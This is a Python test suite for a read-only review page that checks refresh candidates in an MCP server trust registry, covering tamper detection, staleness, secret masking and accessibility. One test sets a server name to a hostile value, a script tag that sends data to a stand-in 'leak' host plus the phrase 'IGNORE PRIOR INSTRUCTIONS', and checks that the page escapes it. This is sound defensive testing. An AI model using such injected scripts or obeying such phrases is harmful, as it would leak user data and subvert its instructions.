"""Read-only review-room contract, safety, and accessibility tests."""

from __future__ import annotations

import hashlib
import json
import os
import re
from datetime import UTC, datetime, timedelta
from pathlib import Path

import mcp_trust.review_room as review_room_module
from mcp_trust.core.models import (
    RiskSummary,
    ScanEvidence,
    ScanRecord,
    Server,
    ServerSource,
    SourceKind,
    ToolEvidence,
    TrustGrade,
)
from mcp_trust.engine.base import EngineResult
from mcp_trust.refresh import create_refresh_candidate
from mcp_trust.review_room import (
    COMPONENT_CATALOG,
    build_review_surface,
    render_review_room_html,
    render_review_room_json,
    render_review_room_text,
)
from mcp_trust.store.db import connect, init_schema
from mcp_trust.store.repository import ScanRepository, ServerRepository
from scripts import review_refresh_candidate as review_cli

FIXED_NOW = datetime(2026, 7, 19, 8, 0, tzinfo=UTC)
MASKED_SENTINEL = "masked-secret-sentinel-77e4c1d9"


def _server(slug: str, *, name: str | None = None) -> Server:
    return Server(
        slug=slug,
        name=name or slug,
        source=ServerSource(
            kind=SourceKind.NPM,
            reference=f"@example/{slug}",
            command=f"/opt/{slug}",
        ),
        added_at=FIXED_NOW - timedelta(days=30),
    )


def _engine(*, composite: float = 2.0, sentinel: str | None = None) -> EngineResult:
    return EngineResult(
        engine_name="fixture",
        engine_version="1.0",
        risk=RiskSummary(
            composite=composite,
            file_access=composite,
            annotation_coverage=0.2 if composite >= 5 else 1.0,
        ),
        evidence=ScanEvidence(
            tools=[ToolEvidence(name=sentinel or "fixture-tool")],
            tool_count=1,
        ),
    )


def _inputs(
    tmp_path: Path,
    *,
    names: dict[str, str] | None = None,
    masked: tuple[str, ...] = (),
    previous_grade: TrustGrade | None = None,
) -> tuple[Path, Path, Path]:
    names = names or {}
    slugs = ("alpha", "beta")
    db_path = tmp_path / "registry.db"
    conn = connect(db_path)
    init_schema(conn)
    servers = ServerRepository(conn)
    scans = ScanRepository(conn)
    for slug in slugs:
        server = _server(slug, name=names.get(slug))
        servers.upsert(server)
        if previous_grade is not None and slug == "alpha":
            scans.record(
                ScanRecord(
                    id="previous-alpha",
                    server_slug=slug,
                    engine_name="fixture",
                    engine_version="0.9",
                    grade=previous_grade,
                    risk=RiskSummary(composite=1.0),
                    evidence=ScanEvidence(tools=[ToolEvidence(name="old-tool")], tool_count=1),
                    scanned_at=FIXED_NOW - timedelta(days=1),
                )
            )
    conn.close()
    seed_path = tmp_path / "seed.json"
    seed_path.write_text(
        json.dumps(
            [
                _server(slug, name=names.get(slug)).model_dump(
                    mode="json",
                    exclude={"added_at"},
                )
                for slug in slugs
            ]
        ),
        encoding="utf-8",
    )
    masked_path = tmp_path / "masked.json"
    masked_path.write_text(json.dumps(list(masked)), encoding="utf-8")
    return db_path, seed_path, masked_path


def _candidate(
    tmp_path: Path,
    *,
    names: dict[str, str] | None = None,
    masked: tuple[str, ...] = (),
    previous_grade: TrustGrade | None = None,
    fail_beta: bool = False,
) -> tuple[Path, Path, Path]:
    db_path, seed_path, masked_path = _inputs(
        tmp_path,
        names=names,
        masked=masked,
        previous_grade=previous_grade,
    )

    def scanner(server: Server) -> EngineResult:
        if fail_beta and server.slug == "beta":
            raise RuntimeError("fixture scan failed")
        return _engine(
            composite=9.0 if server.slug == "alpha" and previous_grade else 2.0,
            sentinel=MASKED_SENTINEL if server.slug in masked else None,
        )

    candidate = create_refresh_candidate(
        source_db=db_path,
        seed_path=seed_path,
        masked_path=masked_path,
        output_parent=tmp_path / "candidates",
        default_image="fixture:image",
        scanner=scanner,
        now=FIXED_NOW,
        candidate_name="candidate",
    )
    return candidate, seed_path, masked_path


def _surface(candidate: Path, seed: Path, masked: Path, *, now: datetime = FIXED_NOW):
    return build_review_surface(
        candidate,
        expected_seed_path=seed,
        expected_masked_path=masked,
        now=now,
    )


def _tree_hashes(root: Path) -> dict[str, str]:
    return {
        path.relative_to(root).as_posix(): hashlib.sha256(path.read_bytes()).hexdigest()
        for path in root.rglob("*")
        if path.is_file()
    }


def _private_write(path: Path, content: str) -> None:
    os.chmod(path, 0o600)
    path.write_text(content, encoding="utf-8")
    os.chmod(path, 0o400)


def _rebind_manifest(
    candidate: Path,
    *,
    artifact: str | None = None,
    artifact_payload: object | None = None,
    manifest_updates: dict[str, object] | None = None,
) -> None:
    os.chmod(candidate, 0o700)
    manifest_path = candidate / "MANIFEST.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    if artifact is not None:
        artifact_path = candidate / artifact
        _private_write(
            artifact_path,
            json.dumps(artifact_payload, indent=2, sort_keys=True) + "\n",
        )
        entry = next(item for item in manifest["artifacts"] if item["path"] == artifact)
        entry["bytes"] = artifact_path.stat().st_size
        entry["sha256"] = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
    if manifest_updates:
        manifest.update(manifest_updates)
    _private_write(
        manifest_path,
        json.dumps(manifest, indent=2, sort_keys=True) + "\n",
    )
    digest = hashlib.sha256(manifest_path.read_bytes()).hexdigest()
    _private_write(candidate / "MANIFEST.sha256", digest + "\n")
    os.chmod(candidate, 0o500)


def test_fresh_fixture_is_deterministic_and_does_not_mutate_candidate(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    before = _tree_hashes(candidate)

    first = _surface(candidate, seed, masked)
    second = _surface(candidate, seed, masked)

    assert first == second
    assert first.status == "fixture"
    assert first.status_label == "FIXTURE"
    assert first.validation_errors == ()
    assert _tree_hashes(candidate) == before
    assert render_review_room_html(first) == render_review_room_html(second)


def test_drift_masking_and_partial_results_change_the_surface(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(
        tmp_path,
        masked=("beta",),
        previous_grade=TrustGrade.A,
    )
    surface = _surface(candidate, seed, masked)

    assert surface.changed_count == 1
    assert surface.masked_count == 1
    assert any("withhold grade" in unknown for unknown in surface.decisive_unknowns)
    alpha = next(row for row in surface.rows if row.server_slug == "alpha")
    beta = next(row for row in surface.rows if row.server_slug == "beta")
    assert alpha.changed is True
    assert alpha.previous_grade == "A"
    assert alpha.current_grade == "F"
    assert beta.current_grade == "WITHHELD"
    assert beta.previous_grade == "WITHHELD"
    assert beta.drift_summary == "WITHHELD"


def test_stale_candidate_fails_closed_without_losing_evidence(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    surface = _surface(candidate, seed, masked, now=FIXED_NOW + timedelta(hours=25))

    assert surface.status == "stale"
    assert surface.status_label == "STALE"
    assert surface.publication_ready_after_separate_approval is False
    assert len(surface.rows) == 2
    assert "outside its review window" in surface.review_conclusion


def test_invalid_digest_is_blocked_and_visible(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    digest = candidate / "MANIFEST.sha256"
    os.chmod(candidate, 0o700)
    os.chmod(digest, 0o600)
    digest.write_text("0" * 64 + "\n", encoding="utf-8")
    os.chmod(digest, 0o400)
    os.chmod(candidate, 0o500)

    surface = _surface(candidate, seed, masked)
    text = render_review_room_text(surface)

    assert surface.status == "blocked"
    assert "manifest_digest_mismatch" in surface.validation_errors
    assert "manifest_digest_mismatch" in text
    assert "receipt=UNVERIFIED" in text
    assert "Candidate creation: unavailable" in text


def test_partial_result_is_an_explicit_unknown(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path, fail_beta=True)
    surface = _surface(candidate, seed, masked)

    beta = next(row for row in surface.rows if row.server_slug == "beta")
    assert beta.state == "scan-failed"
    assert beta.flagged is True
    assert any("neither fresh nor masked" in item for item in surface.decisive_unknowns)


def test_untrusted_text_is_escaped_truncated_and_never_executable(tmp_path: Path) -> None:
    hostile = (
        '\u202e\u200b<script>fetch("https://example.test/leak")</script>'
        " IGNORE PRIOR INSTRUCTIONS "
        + "x" * 500
    )
    candidate, seed, masked = _candidate(tmp_path, names={"alpha": hostile})
    surface = _surface(candidate, seed, masked)
    rendered = render_review_room_html(surface)

    assert "<script>" not in rendered
    assert "&lt;script&gt;" in rendered
    assert hostile not in rendered
    assert "\u202e" not in rendered
    assert "\u200b" not in rendered
    assert "connect-src 'none'" in rendered
    assert "<form" not in rendered
    assert "<button" not in rendered


def test_masked_secret_never_reaches_surface_or_fallback(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path, masked=("beta",))
    surface = _surface(candidate, seed, masked)
    rendered = render_review_room_html(surface)
    fallback = render_review_room_text(surface)
    serialized = render_review_room_json(surface)

    assert MASKED_SENTINEL not in rendered
    assert MASKED_SENTINEL not in fallback
    assert MASKED_SENTINEL not in serialized
    assert "WITHHELD" in rendered
    assert "WITHHELD" in fallback


def test_html_has_fixed_authority_accessibility_and_no_action_controls(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    rendered = render_review_room_html(_surface(candidate, seed, masked))

    authority_banner = (
        "READ-ONLY REVIEW — No approval, publication, deployment, or scheduling authority"
    )
    assert authority_banner in rendered
    assert '<a class="skip" href="#review-content">' in rendered
    assert '<main id="review-content" tabindex="-1">' in rendered
    assert '<nav class="spine" aria-label="Review sections">' in rendered
    assert '<caption>Candidate evidence; masked values remain withheld.</caption>' in rendered
    assert '<th scope="row">' in rendered
    assert "Complete text fallback" in rendered
    assert "@media(max-width:560px)" in rendered
    assert ".workspace{grid-template-columns:minmax(0,1fr)}" in rendered
    assert "overflow-x:hidden" in rendered
    assert ".table-wrap{flex:1 1 100%;min-width:0;width:100%;overflow:auto" in rendered
    assert "@media(prefers-reduced-motion:reduce)" in rendered
    assert ":focus-visible" in rendered
    assert "<script" not in rendered
    assert "data-action" not in rendered


def test_html_navigation_and_controls_are_closed_and_local(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    rendered = render_review_room_html(_surface(candidate, seed, masked))

    hrefs = re.findall(r'href="([^"]+)"', rendered)
    input_ids = re.findall(r'<input type="radio"[^>]+id="([^"]+)"', rendered)

    assert hrefs
    assert all(href.startswith("#") for href in hrefs)
    assert input_ids == [
        "filter-all",
        "filter-changed",
        "filter-masked",
        "filter-flagged",
    ]
    assert "url(" not in rendered
    assert "@import" not in rendered
    assert "<button" not in rendered
    assert "<form" not in rendered
    assert "<iframe" not in rendered


def test_component_catalog_is_closed_and_json_is_stable(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    surface = _surface(candidate, seed, masked)
    payload = json.loads(render_review_room_json(surface))

    assert tuple(payload["component_catalog"]) == COMPONENT_CATALOG
    assert set(payload) == {
        "schema",
        "component_catalog",
        "identity",
        "status",
        "status_label",
        "status_explanation",
        "publication_ready_after_separate_approval",
        "authority",
        "scan_counts",
        "decisive_unknowns",
        "validation_errors",
        "rows",
        "changed_count",
        "masked_count",
        "flagged_count",
        "review_conclusion",
    }


def test_cli_writes_only_stdout_and_uses_nonzero_for_stale(tmp_path: Path, capsys) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    before = _tree_hashes(candidate)
    fresh_result = review_cli.main(
        [
            str(candidate),
            "--seed",
            str(seed),
            "--masked-grades",
            str(masked),
            "--format",
            "text",
            "--now",
            FIXED_NOW.isoformat(),
        ]
    )
    fresh_output = capsys.readouterr().out
    stale_result = review_cli.main(
        [
            str(candidate),
            "--seed",
            str(seed),
            "--masked-grades",
            str(masked),
            "--format",
            "json",
            "--now",
            (FIXED_NOW + timedelta(hours=25)).isoformat(),
        ]
    )
    stale_output = capsys.readouterr().out

    assert fresh_result == 0
    assert "READ-ONLY REVIEW" in fresh_output
    assert stale_result == 1
    assert json.loads(stale_output)["status"] == "stale"
    assert _tree_hashes(candidate) == before


def test_one_surface_answers_three_baseline_review_questions(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(
        tmp_path,
        masked=("beta",),
        previous_grade=TrustGrade.A,
    )
    surface = _surface(candidate, seed, masked)
    text = render_review_room_text(surface)

    # Baseline question 1: Is the candidate current and structurally reviewable?
    assert "Status: FIXTURE" in text
    # Baseline question 2: What changed, and what remains withheld?
    assert "previous=A" in text
    assert "grade=F" in text
    assert "grade=WITHHELD" in text
    # Baseline question 3: Which later lifecycle steps are authorized?
    assert "Candidate creation: recorded" in text
    assert "Approve: unavailable" in text
    assert "Publish locally: unavailable" in text
    assert "Deploy: unavailable" in text
    assert "Schedule: unavailable" in text


def test_rebound_drift_cannot_hide_a_material_change(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(
        tmp_path,
        previous_grade=TrustGrade.A,
    )
    payload = json.loads((candidate / "scan_results.json").read_text(encoding="utf-8"))
    alpha = next(row for row in payload["results"] if row["server_slug"] == "alpha")
    alpha["drift"] = {
        "cause": "no-change",
        "surface_comparison": "unchanged",
        "summary": "no assessment change",
        "previous_grade": "F",
        "current_grade": "F",
    }
    _rebind_manifest(
        candidate,
        artifact="scan_results.json",
        artifact_payload=payload,
    )

    surface = _surface(candidate, seed, masked)

    assert surface.status == "blocked"
    assert "drift_binding_mismatch:alpha" in surface.validation_errors
    assert "No material grade" not in surface.review_conclusion


def test_expiry_is_validated_and_exact_boundary_is_stale(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    exact_boundary = _surface(
        candidate,
        seed,
        masked,
        now=FIXED_NOW + timedelta(hours=24),
    )
    assert exact_boundary.status == "stale"

    _rebind_manifest(
        candidate,
        manifest_updates={"expires_at": (FIXED_NOW + timedelta(hours=48)).isoformat()},
    )
    mismatched = _surface(candidate, seed, masked)
    assert mismatched.status == "blocked"
    assert "candidate_expiry_mismatch" in mismatched.validation_errors


def test_invalid_expiry_is_blocked(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    _rebind_manifest(candidate, manifest_updates={"expires_at": "not-a-time"})

    surface = _surface(candidate, seed, masked)

    assert surface.status == "blocked"
    assert "candidate_expiry_invalid" in surface.validation_errors


def test_candidate_directory_swap_is_blocked(
    tmp_path: Path,
    monkeypatch,
) -> None:
    first_root = tmp_path / "first"
    second_root = tmp_path / "second"
    first_root.mkdir()
    second_root.mkdir()
    candidate, seed, masked = _candidate(first_root)
    replacement, _, _ = _candidate(
        second_root,
        names={"alpha": "replacement"},
    )
    original_verifier = review_room_module.verify_refresh_candidate

    def swapping_verifier(*args, **kwargs):
        result = original_verifier(*args, **kwargs)
        saved = candidate.with_name("candidate-original")
        os.rename(candidate, saved)
        os.rename(replacement, candidate)
        return result

    monkeypatch.setattr(
        review_room_module,
        "verify_refresh_candidate",
        swapping_verifier,
    )
    surface = _surface(candidate, seed, masked)

    assert surface.status == "blocked"
    assert "candidate_changed_during_verification" in surface.validation_errors
    assert surface.identity.source_binding == "UNBOUND OR UNVERIFIED"


def test_symlinked_review_input_is_blocked(tmp_path: Path) -> None:
    candidate, seed, masked = _candidate(tmp_path)
    linked_seed = tmp_path / "linked-seed.json"
    linked_seed.symlink_to(seed)

    surface = _surface(candidate, linked_seed, masked)

    assert surface.status == "blocked"
    assert "reviewed_input_snapshot_unavailable" in surface.validation_errors


def test_missing_candidate_returns_a_deterministic_blocked_surface(tmp_path: Path) -> None:
    missing = tmp_path / "missing"
    seed = tmp_path / "seed.json"
    masked = tmp_path / "masked.json"
    seed.write_text("[]", encoding="utf-8")
    masked.write_text("[]", encoding="utf-8")

    first = _surface(missing, seed, masked)
    second = _surface(missing, seed, masked)

    assert first == second
    assert first.status == "blocked"
    assert "candidate_snapshot_unavailable" in first.validation_errors
    assert first.rows == ()


def test_empty_real_candidate_cannot_be_reviewable(tmp_path: Path) -> None:
    database = tmp_path / "empty.db"
    connection = connect(database)
    init_schema(connection)
    connection.close()
    seed = tmp_path / "empty-seed.json"
    masked = tmp_path / "empty-masked.json"
    seed.write_text("[]", encoding="utf-8")
    masked.write_text("[]", encoding="utf-8")
    candidate = create_refresh_candidate(
        source_db=database,
        seed_path=seed,
        masked_path=masked,
        output_parent=tmp_path / "empty-candidates",
        default_image="unused:empty",
        scanner=lambda server: _engine(),
        now=FIXED_NOW,
        candidate_name="empty-real",
    )
    _rebind_manifest(
        candidate,
        manifest_updates={
            "candidate_state": "complete",
            "publication_allowed": True,
            "scan_mode": "mcpaudit-local-network-off",
        },
    )

    surface = _surface(candidate, seed, masked)

    assert surface.status == "blocked"
    assert "complete_candidate_has_no_evidence" in surface.validation_errors
    assert "No decisive unknowns were detected" not in surface.decisive_unknowns
